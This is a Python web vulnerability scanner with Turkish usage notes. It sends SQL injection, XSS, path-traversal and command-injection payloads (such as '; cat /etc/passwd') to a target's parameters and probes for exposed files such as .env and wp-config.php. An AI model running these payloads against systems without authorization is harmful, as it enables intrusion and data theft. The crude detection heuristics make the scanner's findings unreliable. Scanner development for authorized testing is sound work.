#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate Web Security Scanner 

💻 Başlatma Komutları:

Temel Tarama:
python Rinchen.py -u "https://example.com" -v

Crawl ile Tarama:
python Rinchen.py -u "https://example.com" -v -c

Hızlı Tarama (20 thread):
python Rinchen.py -u "https://example.com" -v -t 20

Parametreli URL:
python Rinchen.py -u "https://example.com/page.php?id=1" -v

JSON Rapor ile:
python Rinchen.py -u "https://example.com" -v -o rapor.json

Tam Özellikli:
python Rinchen.py -u "https://example.com" -v -c -t 20 -o rapor.json

Büyük Siteler:
python Rinchen.py -u "https://www.example.com" -v -c -t 15 --timeout 30

"""
import requests
import re
import time
import sys
import json
import random
import ssl
import socket
import datetime
import urllib.parse
import concurrent.futures
from typing import Dict, Any, Set, List, Tuple, Optional
from dataclasses import dataclass, asdict, field
from enum import Enum
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import whois
import warnings

warnings.filterwarnings('ignore')
requests.packages.urllib3.disable_warnings()
init(autoreset=True)

# ============================================================================
# ENUMS & DATA CLASSES
# ============================================================================
class VulnerabilityLevel(Enum):
    """Vulnerability severity levels"""
    INFO = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

@dataclass
class Vulnerability:
    """Vulnerability details"""
    name: str
    description: str
    url: str
    level: VulnerabilityLevel
    details: Dict[str, Any] = field(default_factory=dict)
    cwe: str = ""
    cvss_score: float = 0.0
    exploit_available: bool = False
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.datetime.now().isoformat()

# ============================================================================
# PAYLOAD ENGINE
# ============================================================================
class AdvancedPayloadEngine:
    """Advanced payload database"""
    
    @staticmethod
    def get_sqli_payloads() -> Dict[str, List]:
        """SQL injection payloads"""
        return {
            'error_based': [
                "'", "\"", "`",
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
                "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,database()),1)--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND 1=CONVERT(int,@@version)--",
                "' UNION SELECT NULL FROM DUAL--",
            ],
            'boolean_blind': [
                ("' AND 1=1--", "' AND 1=2--"),
                ("' AND 'a'='a'--", "' AND 'a'='b'--"),
                ("') AND ('1'='1", "') AND ('1'='2"),
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' AND BENCHMARK(5000000,MD5(1))--",
            ],
        }
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
        ]
    
    @staticmethod
    def get_lfi_payloads() -> List[str]:
        """LFI payloads"""
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Command injection payloads"""
        return [
            "; ls -la",
            "| whoami",
            "& dir",
            "; cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; uname -a",
        ]

# ============================================================================
# ULTIMATE SCANNER
# ============================================================================
class UltimateWebScanner:
    """Ultimate web vulnerability scanner"""
    
    def __init__(self, target: str, verify_ssl: bool = False, verbose: bool = True,
                 crawl: bool = False, max_urls: int = 100, threads: int = 10,
                 timeout: int = 15, delay: float = 0.1, output_file: str = None):
        
        self.target = self._normalize_url(target)
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.crawl = crawl
        self.max_urls = max_urls
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.output_file = output_file
        
        # Session
        self.session = requests.Session()
        self.session.verify = False
        
        # State
        self.scanned_urls: Set[str] = set()
        self.queued_urls: Set[str] = {self.target}
        self.found_vulnerabilities: List[Vulnerability] = []
        self.tested_params: Set[Tuple] = set()
        self.discovered_paths: List[str] = []
        
        # Detection
        self.waf_detected = False
        self.waf_type = "Unknown"
        self.cms_detected = None
        self.server_info = {}
        
        # Payloads
        self.payload_engine = AdvancedPayloadEngine()
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        # Sensitive files
        self.sensitive_files = [
            '.env', '.git/config', 'wp-config.php', 'config.php',
            'configuration.php', 'settings.php', 'database.php',
            'backup.sql', 'backup.zip', 'phpinfo.php', 'info.php',
            'robots.txt', '.htaccess', 'web.config', 'error_log',
            'admin/', 'wp-admin/', 'administrator/', 'phpmyadmin/',
            'api/', 'swagger.json', 'config.json', '.DS_Store',
        ]
        
        # CMS patterns
        self.cms_patterns = {
            'WordPress': ['wp-content', 'wp-includes', '/wp-login.php', 'wp-json'],
            'Joomla': ['/administrator/', 'com_content', '/templates/', 'joomla'],
            'Drupal': ['Drupal.settings', '/sites/default/', '/core/misc/drupal.js'],
            'Magento': ['Mage.Cookies', '/skin/frontend/', '/media/js/mage'],
            'Laravel': ['/storage/framework/', 'mix-manifest.json', 'laravel_session'],
            'Shopify': ['cdn.shopify.com', 'Shopify.theme'],
        }
        
        # HTTP methods
        self.risky_http_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        
        # Statistics
        self.stats = {
            'start_time': time.time(),
            'scan_duration': 0,
            'urls_scanned': 0,
            'parameters_tested': 0,
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'critical': 0,
            'high': 0,
            'medium': 0,
        }
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not re.match(r'^https?://', url):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _log(self, message: str, level: str = "info"):
        """Colored logging"""
        if not self.verbose:
            return
        
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "vuln": Fore.RED + Style.BRIGHT,
            "test": Fore.BLUE,
        }
        
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        color = colors.get(level, Fore.CYAN)
        print(f"{Style.BRIGHT}[{timestamp}]{Style.RESET_ALL} {color}[{level.upper()}]{Style.RESET_ALL} {message}")
    
    def _make_request(self, url: str, method: str = "GET", **kwargs) -> Tuple[Optional[requests.Response], float]:
        """Make HTTP request"""
        try:
            time.sleep(self.delay)
            
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('headers', {}).update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            kwargs['verify'] = False
            kwargs.setdefault('allow_redirects', False)
            
            self.stats['requests_sent'] += 1
            
            start = time.time()
            response = self.session.request(method, url, **kwargs)
            elapsed = time.time() - start
            
            return response, elapsed
            
        except Exception:
            return None, 0.0
    
    def _add_vulnerability(self, name: str, description: str, url: str,
                          level: VulnerabilityLevel, details: Dict = None,
                          cwe: str = "", cvss_score: float = 0.0,
                          exploit_available: bool = False):
        """Add vulnerability (skip INFO)"""
        
        # SKIP INFO level (we only want MEDIUM, HIGH, CRITICAL)
        if level == VulnerabilityLevel.INFO:
            return
        
        vuln = Vulnerability(
            name=name,
            description=description,
            url=url,
            level=level,
            details=details or {},
            cwe=cwe,
            cvss_score=cvss_score,
            exploit_available=exploit_available
        )
        
        self.found_vulnerabilities.append(vuln)
        self.stats['vulnerabilities_found'] += 1
        
        if level == VulnerabilityLevel.CRITICAL:
            self.stats['critical'] += 1
        elif level == VulnerabilityLevel.HIGH:
            self.stats['high'] += 1
        elif level == VulnerabilityLevel.MEDIUM:
            self.stats['medium'] += 1
        
        self._log(f"VULN: {name} [{level.name}]", "vuln")
    
    # ========================================================================
    # INFORMATION GATHERING
    # ========================================================================
    def _gather_basic_info(self, response: requests.Response):
        """Gather basic information"""
        self._log("Gathering basic information...", "info")
        
        try:
            # Server info
            server = response.headers.get('Server', 'Unknown')
            powered_by = response.headers.get('X-Powered-By', 'Unknown')
            
            self.server_info = {
                'server': server,
                'powered_by': powered_by
            }
            
            self._log(f"  Server: {server}")
            self._log(f"  X-Powered-By: {powered_by}")
            
            # IP & WHOIS
            hostname = urllib.parse.urlparse(self.target).netloc.split(':')[0]
            try:
                ip = socket.gethostbyname(hostname)
                self._log(f"  IP: {ip}")
                
                # WHOIS
                try:
                    w = whois.whois(hostname)
                    if w.creation_date:
                        creation = w.creation_date[0] if isinstance(w.creation_date, list) else w.creation_date
                        self._log(f"  WHOIS Created: {creation}")
                except:
                    pass
            except:
                pass
            
        except Exception as e:
            self._log(f"Info gathering error: {str(e)}", "error")
    
    def _detect_waf(self):
        """Detect WAF"""
        self._log("Detecting WAF...", "info")
        
        waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'AWS WAF': ['x-amzn-requestid'],
            'Akamai': ['akamai'],
            'Imperva': ['incapsula', 'visid_incap'],
            'ModSecurity': ['mod_security'],
            'Sucuri': ['sucuri'],
            'Wordfence': ['wordfence'],
        }
        
        response, _ = self._make_request(self.target)
        
        if response:
            headers_str = str(response.headers).lower()
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in headers_str:
                        self.waf_detected = True
                        self.waf_type = waf_name
                        self._log(f"WAF Detected: {waf_name}", "warning")
                        return
        
        self._log("No WAF detected", "success")
    
    def _detect_cms(self, response: requests.Response):
        """Detect CMS"""
        text = response.text.lower()
        
        for cms_name, patterns in self.cms_patterns.items():
            for pattern in patterns:
                if pattern.lower() in text:
                    self.cms_detected = cms_name
                    self._log(f"CMS Detected: {cms_name}", "success")
                    return
    
    def _check_ssl(self):
        """Check SSL/TLS"""
        if not self.target.startswith('https'):
            self._add_vulnerability(
                name="No HTTPS",
                description="Site not using HTTPS",
                url=self.target,
                level=VulnerabilityLevel.HIGH,
                cwe="CWE-319",
                cvss_score=7.4
            )
            return
        
        try:
            hostname = urllib.parse.urlparse(self.target).netloc.split(':')[0]
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check expiry
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        if datetime.datetime.now() > expiry:
                            self._add_vulnerability(
                                name="Expired SSL Certificate",
                                description="SSL certificate has expired",
                                url=self.target,
                                level=VulnerabilityLevel.HIGH,
                                cwe="CWE-295",
                                cvss_score=7.5
                            )
        except:
            pass
    
    # ========================================================================
    # DIRECTORY BRUTEFORCE
    # ========================================================================
    def _directory_bruteforce(self):
        """Bruteforce directories"""
        self._log("Directory bruteforce...", "info")
        
        def check_path(path):
            url = urllib.parse.urljoin(self.target, path)
            response, _ = self._make_request(url)
            
            if response and response.status_code in [200, 301, 302]:
                self.discovered_paths.append(path)
                
                # Critical files
                if path in ['.env', 'wp-config.php', 'config.php', 'database.sql']:
                    if response.status_code == 200:
                        self._add_vulnerability(
                            name="Sensitive File Exposure",
                            description=f"Sensitive file accessible: {path}",
                            url=url,
                            level=VulnerabilityLevel.CRITICAL,
                            cwe="CWE-200",
                            cvss_score=9.1,
                            exploit_available=True
                        )
                
                # Admin panels
                if 'admin' in path.lower() and response.status_code == 200:
                    self._add_vulnerability(
                        name="Admin Panel Exposure",
                        description=f"Admin panel found: {path}",
                        url=url,
                        level=VulnerabilityLevel.MEDIUM,
                        cwe="CWE-425",
                        cvss_score=5.3
                    )
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_path, self.sensitive_files)
    
    # ========================================================================
    # VULNERABILITY TESTING
    # ========================================================================
    def _test_sql_injection(self, url: str, param: str, method: str):
        """Test SQL injection"""
        signature = (url, param, 'sqli', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        self.stats['parameters_tested'] += 1
        
        self._log(f"Testing SQLi: {param}", "test")
        
        payloads = self.payload_engine.get_sqli_payloads()
        
        # Error-based
        for payload in payloads['error_based'][:6]:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request(test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request(url, 'POST', data=data)
            
            if response and self._is_sql_error(response.text):
                self._add_vulnerability(
                    name="SQL Injection (Error-Based)",
                    description=f"SQL injection in parameter '{param}'",
                    url=url,
                    level=VulnerabilityLevel.CRITICAL,
                    details={'parameter': param, 'payload': payload},
                    cwe="CWE-89",
                    cvss_score=9.8,
                    exploit_available=True
                )
                return
        
        # Time-based
        for payload in payloads['time_based'][:3]:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, elapsed = self._make_request(test_url)
            else:
                data = {param: payload}
                response, elapsed = self._make_request(url, 'POST', data=data)
            
            if elapsed >= 4.5:
                self._add_vulnerability(
                    name="SQL Injection (Time-Based Blind)",
                    description=f"Time-based SQLi in parameter '{param}'",
                    url=url,
                    level=VulnerabilityLevel.HIGH,
                    details={'parameter': param, 'payload': payload, 'response_time': f"{elapsed:.2f}s"},
                    cwe="CWE-89",
                    cvss_score=8.6,
                    exploit_available=True
                )
                return
    
    def _is_sql_error(self, text: str) -> bool:
        """Check SQL errors"""
        errors = [
            r"sql syntax", r"mysql", r"postgresql", r"oracle",
            r"sqlite", r"odbc", r"sqlstate", r"syntax error"
        ]
        
        for pattern in errors:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _test_xss(self, url: str, param: str, method: str):
        """Test XSS"""
        signature = (url, param, 'xss', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._log(f"Testing XSS: {param}", "test")
        
        payloads = self.payload_engine.get_xss_payloads()
        
        for payload in payloads[:4]:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request(test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request(url, 'POST', data=data)
            
            if response and payload in response.text:
                self._add_vulnerability(
                    name="Cross-Site Scripting (XSS)",
                    description=f"XSS in parameter '{param}'",
                    url=url,
                    level=VulnerabilityLevel.HIGH,
                    details={'parameter': param, 'payload': payload},
                    cwe="CWE-79",
                    cvss_score=7.1,
                    exploit_available=True
                )
                return
    
    def _test_lfi(self, url: str, param: str, method: str):
        """Test LFI"""
        signature = (url, param, 'lfi', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._log(f"Testing LFI: {param}", "test")
        
        payloads = self.payload_engine.get_lfi_payloads()
        
        for payload in payloads[:4]:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request(test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request(url, 'POST', data=data)
            
            if response:
                if 'root:x:0' in response.text or 'daemon:x:1' in response.text:
                    self._add_vulnerability(
                        name="Local File Inclusion (LFI)",
                        description=f"LFI in parameter '{param}'",
                        url=url,
                        level=VulnerabilityLevel.CRITICAL,
                        details={'parameter': param, 'payload': payload},
                        cwe="CWE-98",
                        cvss_score=9.1,
                        exploit_available=True
                    )
                    return
    
    def _test_command_injection(self, url: str, param: str, method: str):
        """Test command injection"""
        signature = (url, param, 'cmdi', method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        
        self._log(f"Testing Command Injection: {param}", "test")
        
        payloads = self.payload_engine.get_command_injection_payloads()
        
        for payload in payloads[:3]:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response, _ = self._make_request(test_url)
            else:
                data = {param: payload}
                response, _ = self._make_request(url, 'POST', data=data)
            
            if response:
                if any(kw in response.text.lower() for kw in ['uid=', 'gid=', 'root', 'www-data']):
                    self._add_vulnerability(
                        name="OS Command Injection",
                        description=f"Command injection in parameter '{param}'",
                        url=url,
                        level=VulnerabilityLevel.CRITICAL,
                        details={'parameter': param, 'payload': payload},
                        cwe="CWE-78",
                        cvss_score=10.0,
                        exploit_available=True
                    )
                    return
    
    def _check_http_methods(self):
        """Check risky HTTP methods"""
        for method in self.risky_http_methods:
            response, _ = self._make_request(self.target, method=method)
            
            if response and 200 <= response.status_code < 300:
                self._add_vulnerability(
                    name=f"Risky HTTP Method: {method}",
                    description=f"HTTP {method} method enabled",
                    url=self.target,
                    level=VulnerabilityLevel.MEDIUM,
                    details={'method': method, 'status': response.status_code},
                    cwe="CWE-650",
                    cvss_score=5.3
                )
    
    # ========================================================================
    # CRAWLING & SCANNING
    # ========================================================================
    def _extract_links(self, html: str, base_url: str) -> Set[str]:
        """Extract links from HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            links = set()
            
            for tag in soup.find_all(['a', 'link', 'script', 'form']):
                for attr in ['href', 'src', 'action']:
                    if attr in tag.attrs:
                        url = tag[attr].strip()
                        if url and not url.startswith(('javascript:', 'mailto:', '#')):
                            absolute = urllib.parse.urljoin(base_url, url)
                            links.add(absolute)
            
            return links
        except:
            return set()
    
    def _scan_url(self, url: str) -> Set[str]:
        """Scan single URL"""
        if url in self.scanned_urls:
            return set()
        
        self._log(f"Scanning: {url[:60]}...", "info")
        self.scanned_urls.add(url)
        self.stats['urls_scanned'] += 1
        
        response, _ = self._make_request(url)
        if not response:
            return set()
        
        # Parse parameters
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            
            for param in params:
                self._test_sql_injection(url, param, 'GET')
                self._test_xss(url, param, 'GET')
                self._test_lfi(url, param, 'GET')
                self._test_command_injection(url, param, 'GET')
        
        # Extract links
        if self.crawl:
            return self._extract_links(response.text, url)
        
        return set()
    
    def _crawl_site(self):
        """Crawl site"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.queued_urls and len(self.scanned_urls) < self.max_urls:
                batch = list(self.queued_urls)[:50]
                self.queued_urls -= set(batch)
                
                futures = {}
                for url in batch:
                    if url not in self.scanned_urls:
                        futures[executor.submit(self._scan_url, url)] = url
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        new_urls = future.result()
                        base_domain = urllib.parse.urlparse(self.target).netloc
                        
                        for new_url in new_urls:
                            if urllib.parse.urlparse(new_url).netloc == base_domain:
                                if new_url not in self.scanned_urls:
                                    self.queued_urls.add(new_url)
                    except:
                        pass
    
    # ========================================================================
    # MAIN
    # ========================================================================
    def run(self):
        """Run scan"""
        print(f"{Style.BRIGHT}{Fore.CYAN}")
        print("╔════════════════════════════════════════════════════════════════════╗")
        print("║                                                                    ║")
        print("║     Ultimate Web Security Scanner v8.0 - Master Edition           ║")
        print("║          Professional Vulnerability Assessment Framework          ║")
        print("║                                                                    ║")
        print("╚════════════════════════════════════════════════════════════════════╝")
        print(f"{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  For authorized testing only - No LOW findings{Style.RESET_ALL}\n")
        
        self._log("="*70, "info")
        self._log(f"Target: {self.target}", "info")
        self._log(f"Threads: {self.threads}", "info")
        self._log("="*70, "info")
        
        # Initial check
        response, _ = self._make_request(self.target)
        if not response:
            self._log("Target unreachable", "error")
            return
        
        # Gathering
        self._gather_basic_info(response)
        self._detect_waf()
        self._detect_cms(response)
        self._check_ssl()
        
        # Scanning
        self._directory_bruteforce()
        self._check_http_methods()
        
        # Main scan
        if self.crawl:
            self._crawl_site()
        else:
            self._scan_url(self.target)
        
        # Summary
        self._print_summary()
        
        # Export
        if self.output_file:
            self._export_report()
    
    def _print_summary(self):
        """Print summary"""
        duration = time.time() - self.stats['start_time']
        
        print(f"\n{Style.BRIGHT}{'='*70}{Style.RESET_ALL}")
        print(f"{Style.BRIGHT}{Fore.CYAN}SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Style.BRIGHT}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"  Duration:             {duration:.2f}s")
        print(f"  URLs Scanned:         {self.stats['urls_scanned']}")
        print(f"  Parameters Tested:    {self.stats['parameters_tested']}")
        print(f"  Requests Sent:        {self.stats['requests_sent']}")
        
        if self.waf_detected:
            print(f"\n  WAF:                  {Fore.YELLOW}{self.waf_type}{Style.RESET_ALL}")
        
        if self.cms_detected:
            print(f"  CMS:                  {Fore.GREEN}{self.cms_detected}{Style.RESET_ALL}")
        
        print(f"\n{Style.BRIGHT}Vulnerabilities: {self.stats['vulnerabilities_found']}{Style.RESET_ALL}\n")
        
        if self.found_vulnerabilities:
            if self.stats['critical'] > 0:
                print(f"{Fore.RED}  CRITICAL: {self.stats['critical']}{Style.RESET_ALL}")
            if self.stats['high'] > 0:
                print(f"{Fore.RED}  HIGH: {self.stats['high']}{Style.RESET_ALL}")
            if self.stats['medium'] > 0:
                print(f"{Fore.YELLOW}  MEDIUM: {self.stats['medium']}{Style.RESET_ALL}")
            
            print(f"\n{Style.BRIGHT}Details:{Style.RESET_ALL}\n")
            
            for i, vuln in enumerate(self.found_vulnerabilities, 1):
                color = Fore.RED if vuln.level in [VulnerabilityLevel.CRITICAL, VulnerabilityLevel.HIGH] else Fore.YELLOW
                
                print(f"{color}[{i}] {vuln.name} ({vuln.level.name}){Style.RESET_ALL}")
                print(f"    CWE: {vuln.cwe} | CVSS: {vuln.cvss_score}")
                print(f"    URL: {vuln.url}")
                print(f"    Description: {vuln.description}")
                if vuln.exploit_available:
                    print(f"    {Fore.RED}[!] Public exploit available{Style.RESET_ALL}")
                print()
        else:
            print(f"{Fore.GREEN}  No vulnerabilities found{Style.RESET_ALL}")
        
        print(f"{Style.BRIGHT}{'='*70}{Style.RESET_ALL}\n")
    
    def _export_report(self):
        """Export JSON report"""
        report = {
            'scan_info': {
                'target': self.target,
                'timestamp': datetime.datetime.now().isoformat(),
                'duration': time.time() - self.stats['start_time'],
                'waf_detected': self.waf_detected,
                'cms_detected': self.cms_detected
            },
            'statistics': self.stats,
            'vulnerabilities': [asdict(v) for v in self.found_vulnerabilities]
        }
        
        with open(self.output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self._log(f"Report saved: {self.output_file}", "success")

# ============================================================================
# MAIN
# ============================================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Ultimate Web Security Scanner v8.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic scan:
    python3 ultimate_scanner.py -u "https://example.com" -v
  
  With crawling:
    python3 ultimate_scanner.py -u "https://example.com" -v -c
  
  Fast scan:
    python3 ultimate_scanner.py -u "https://example.com" -v -t 20
  
  Full scan with report:
    python3 ultimate_scanner.py -u "https://example.com" -v -c -o report.json

⚠️  For authorized testing only!
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl site")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout (default: 15)")
    parser.add_argument("-o", "--output", help="Output JSON file")
    
    args = parser.parse_args()
    
    scanner = UltimateWebScanner(
        target=args.url,
        verbose=args.verbose,
        crawl=args.crawl,
        threads=args.threads,
        timeout=args.timeout,
        output_file=args.output
    )
    
    try:
        scanner.run()
        sys.exit(0)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(130)

if __name__ == "__main__":
    main()
